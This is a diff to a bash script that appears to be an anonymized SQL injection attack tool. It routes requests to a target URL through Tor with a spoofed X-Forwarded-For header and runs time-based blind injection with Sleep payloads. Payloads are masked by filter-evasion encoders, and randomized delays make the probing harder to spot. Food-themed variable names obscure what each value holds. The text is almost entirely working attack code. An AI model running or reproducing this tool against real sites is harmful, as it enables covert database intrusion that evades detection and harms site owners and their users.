@@ -4,8 +4,8 @@
 
 # Code version 2
 # I myself still wondering, why do i name this "risk".
-# Welp, sunshine and rainbow. For this file, me will make the variable "chill now. (ig)
-
+# Welp, sunshine and rainbow. For this file, me will make the variable sweer sweet. ig
+#chinesee, ah i forgot how to spell chinese. Ah whatever,correct me if the food's name wrong.
 echo ""
 echo -e "\e[0;33m[\e[0m!\e[0;33m]\e[0m You just toggle on risk mode.. So, as i promise, RISK MODE ACTIVE." 
 echo ""
@@ -55,22 +55,24 @@ Chicken() {
 }
 
 time_audit_engine() {
-    local extra_spicy_sauce="$1"
-    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Auditing Latency: $target_url$extra_spicy_sauce"
-    local secret_msg_powder="${extra_spicy_sauce}Sleep(5)))v)--+"
-    local stopwatch_seconds=$(curl --socks5-hostname 127.0.0.1:9050 -m 12 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$secret_msg_powder")
-    echo -e "[i] Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
+    local tangyuan="$1"
+    local mooncake="$2"
+    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Auditing Latency: $target_url$tangyuan$mooncake"
+    
+    local stopwatch_seconds=$(curl --socks5-hostname 127.0.0.1:9050 -m 15 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$tangyuan$mooncake")
 
-    if (( $(echo "$stopwatch_seconds > 3.0" | bc -l) )); then
-        local warm_rice_bowl="${extra_spicy_sauce}Sleep(1)))v)--+"
-        local wash_hands_now=$(curl --socks5-hostname 127.0.0.1:9050 -m 8 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$warm_rice_bowl")
+    if (( $(echo "$stopwatch_seconds > 4.0" | bc -l) )); then
+        local ba_bao_fan=$(echo "$mooncake" | sed 's/Sleep(5)/Sleep(2)/g' | sed 's/sleep(5)/sleep(2)/g')
+        local wash_hands_now=$(curl --socks5-hostname 127.0.0.1:9050 -m 10 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$tangyuan$ba_bao_fan")
 
-        if (( $(echo "$wash_hands_now > 2.0" | bc -l) )) && (( $(echo "$wash_hands_now < 4.0" | bc -l) )); then
+        if (( $(echo "$wash_hands_now > 1.5" | bc -l) )) && (( $(echo "$wash_hands_now < 3.5" | bc -l) )); then
+            echo -e "[i] Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
             echo -e "[i] Time Delay First Check (${stopwatch_seconds}s) | Second Check (${wash_hands_now}s)"
             echo -e "\e[0;31m[!+!] 'Confirmed' Genuine Time Based Vulnerability!\e[0m"
-            echo "SQLI_ALERT|${extra_spicy_sauce}" >> "$ROOT_LOG_FILE"
+            echo "SQLI_ALERT|$tangyuan$mooncake" >> "$ROOT_LOG_FILE"
             return 0
         else
+            echo -e "[i] Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
             echo -e "[i] Time Delay First Check (${stopwatch_seconds}s) | Second Check (${wash_hands_now}s)"
             echo -e "\e[0;33m[-] Status: False postive, neither network lag or server defense mechanism detected.\e[0m"
         fi
@@ -94,12 +96,13 @@ gentle_probe_engine() {
 }
 
 risk_stage_success="false"
-shuf "$Cupcake_pie" | while IFS= read -r target_word || [ -n "$target_word" ]; do
+while IFS= read -r target_word || [ -n "$target_word" ]; do
     [[ -z "$target_word" || "$target_word" =~ ^# ]] && continue
     if Chicken "$target_word"; then
         risk_stage_success="true"
     fi
-done
+    sleep $((4 + RANDOM % 5))
+done < <(shuf "$Cupcake_pie")
 
 if [ "$risk_stage_success" = "false" ]; then
     echo -e "\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Stage 1 failed to acquire 200 OK. Escalating to Time based."
@@ -107,28 +110,31 @@ if [ "$risk_stage_success" = "false" ]; then
     sleep 5
 
     sqli_stage_success="false"
-    shuf "$Strawberry_pudding" | while IFS= read -r sqli_payload || [ -n "$sqli_payload" ]; do
+    while IFS= read -r sqli_payload || [ -n "$sqli_payload" ]; do
         [[ -z "$sqli_payload" || "$sqli_payload" =~ ^# ]] && continue
-        
-        lapis_satu=$(space2comment_engine "$sqli_payload") #Lol, i like lapis. Lapis is not that blu blu thing. Ah yk yk.
+
+        local tangyuan=$(echo "$sqli_payload" | awk -F' ' '{print $1}')
+        local mooncake=$(echo "$sqli_payload" | cut -d' ' -f2-)
+
+        lapis_satu=$(space2comment_engine "$mooncake") #Lol, i like lapis. Lapis is not that blu blu thing. Ah yk yk.
         lapis_dua=$(between_engine "$lapis_satu") #Im proud eating lapis.
         lapis_tiga=$(charencode_engine "$lapis_dua") #Zamn, lapis.
         masked_payload=$(appendnullbyte_engine "$lapis_tiga") #"masked payload", i dont really like that name. Any suggestion to change it?
-        
-        if time_audit_engine "$masked_payload"; then
+
+        if time_audit_engine "$tangyuan" "$masked_payload"; then
             sqli_stage_success="true"
         fi
         sleep $((5 + RANDOM % 4))
-    done
+    done < <(shuf "$Strawberry_pudding")
 
     if [ "$sqli_stage_success" = "false" ]; then
         echo -e "\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Time based returned zero anomalies. Dropping gear to Gentle Mode."
 
-        shuf "$Choco_muffin" | while IFS= read -r gentle_word || [ -n "$gentle_word" ]; do
+        while IFS= read -r gentle_word || [ -n "$gentle_word" ]; do
             [[ -z "$gentle_word" || "$gentle_word" =~ ^# ]] && continue
             gentle_probe_engine "$gentle_word"
             sleep $((3 + RANDOM % 3))
-        done
+        done < <(shuf "$Choco_muffin")
     fi
 fi
 
